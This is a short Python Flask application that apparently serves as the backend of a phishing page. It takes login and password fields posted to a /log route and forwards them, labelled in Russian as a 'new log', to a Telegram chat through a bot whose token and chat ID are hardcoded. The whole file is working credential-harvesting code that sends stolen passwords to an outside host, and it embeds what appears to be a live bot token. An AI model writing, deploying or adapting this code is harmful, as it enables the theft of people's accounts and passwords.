from flask import Flask, request, render_template
import urllib.request
import urllib.parse

app = Flask(__name__)

TG_TOKEN = "9165193721:AAF5H_vLPBG8qZDKvZ1_A94TNGEk1tpFt9Y"
TG_CHAT_ID = "8938744236"

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/log', methods=['POST'])
def log():
    login = request.form.get('login', '')
    password = request.form.get('pass', '')
    
    msg = f"🔐 Новый лог!\n👤 Логин: {login}\n🔑 Пароль: {password}"
    
    tg_url = f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage"
    data = urllib.parse.urlencode({'chat_id': TG_CHAT_ID, 'text': msg}).encode('utf-8')
    try:
        urllib.request.urlopen(tg_url, data=data)
    except Exception as e:
        print("Ошибка ТГ:", e)
        
    return 'OK', 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
